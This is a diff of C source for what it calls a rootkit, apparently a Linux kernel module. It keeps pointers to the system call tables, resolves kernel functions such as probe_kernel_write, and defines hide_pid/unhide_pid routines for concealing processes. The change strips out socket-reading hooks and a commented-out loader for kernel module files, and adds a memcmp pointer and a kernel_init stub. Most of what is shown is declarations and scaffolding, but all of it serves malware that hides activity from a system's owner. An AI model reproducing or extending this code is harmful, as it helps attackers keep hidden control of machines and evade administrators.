@@ -78,36 +78,24 @@ void **my_ia32sct = NULL;
 void **my_sct = NULL;
 void **sys_call_table = NULL;
 void **ia32_sys_call_table = NULL;
-unsigned int *psct_fastpath = NULL;
-unsigned int *psct_slowpath = NULL;
-unsigned int *pia32sct = NULL;
 unsigned int kernel_tree = 0;
 mm_segment_t *addr_limit = 0;
 long *sct_refs = NULL, *ia32sct_refs = NULL;
 size_t nsct_refs = 0, nia32sct_refs = 0;
 
 // function variables
-int (*tr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags) = NULL;
 void * (*f_kmalloc)(size_t size, gfp_t flags) = NULL;
 void (*f_kfree)(const void *) = NULL;
 struct pid * (*f_find_vpid)(pid_t nr) = NULL;
 int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args) = NULL;
 int (*f_sys_write)(int fd, const char *mem, size_t len) = NULL;
 int (*f_printk)(const char *fmt, ...) = NULL;
-struct socket * (*f_sockfd_lookup)(int fd, int *err) = NULL;
 long (*f_probe_kernel_write)(void *dst, const void *src, size_t len) = NULL;
 int (*f_strncmp)(const char *s1, const char *s2, size_t len) = NULL;
-struct file * (*f_fget)(unsigned int fd) = NULL;
-void (*f_fput)(struct file *) = NULL;
-struct socket * (*f_sock_from_file)(struct file *file, int *err) = NULL;
 size_t (*f_strlen)(const char *) = NULL;
 int (*f_kstrtoull)(const char *s, unsigned int base, unsigned long long *res) = NULL;
 void * (*f_memcpy)(void *dest, const void *src, size_t count) = NULL;
-void (*f_skb_prepare_seq_read)(struct sk_buff *skb, unsigned int from,
-			  unsigned int to, struct skb_seq_state *st) = NULL;
-unsigned int (*f_skb_seq_read)(unsigned int consumed, const u8 **data,
-			  struct skb_seq_state *st) = NULL;
-void (*f_skb_abort_seq_read)(struct skb_seq_state *st) = NULL;
+int (*f_memcmp)(const void *cs, const void *ct, size_t count) = NULL;
 
 /*
  * RootKit's functions definitions.
@@ -121,6 +109,10 @@ void kernel_test(void) {
 	pinfo("my_ia32sct          = %lx\n", my_ia32sct);
 
 	pinfo("Probably if you arrived here, I'm going to work fine! =)\n");
+}
+
+void kernel_init(void) {
+	pinfo("Hello from kernel_init()!\n");
 }
 
 int hide_pid(pid_t nr) {
@@ -153,40 +145,6 @@ int unhide_pid(pid_t nr) {
 	
 	return -1;
 }
-
-/*
-void *readfile(const char *file, size_t *len) {
-	int fd;
-	void *buf;
-	struct stat fd_st;
-
-	mm_segment_t old_fs = my_get_fs();
-	my_set_fs(KERNEL_DS);
-	fd = open(file, O_RDONLY, 0);
-	if (fd >= 0) {
-		newfstat(fd, &fd_st);
-		buf = kmalloc(fd_st.st_size, GFP_KERNEL);
-		if (buf) {
-			if (read(fd, buf, fd_st.st_size) == fd_st.st_size) {
-				*len = fd_st.st_size;
-				close(fd);
-				return buf;
-			} else {
-				perr("can't read lkm");
-			}
-		} else {
-			perr("create_load_info kmalloc error");
-		}
-
-		close(fd);
-	} else {
-		perr("can't open lkm");
-	}
-	my_set_fs(old_fs);
-
-	return NULL;
-}
-*/
 
 int pinfo(const char *fmt, ...) {
     va_list args;
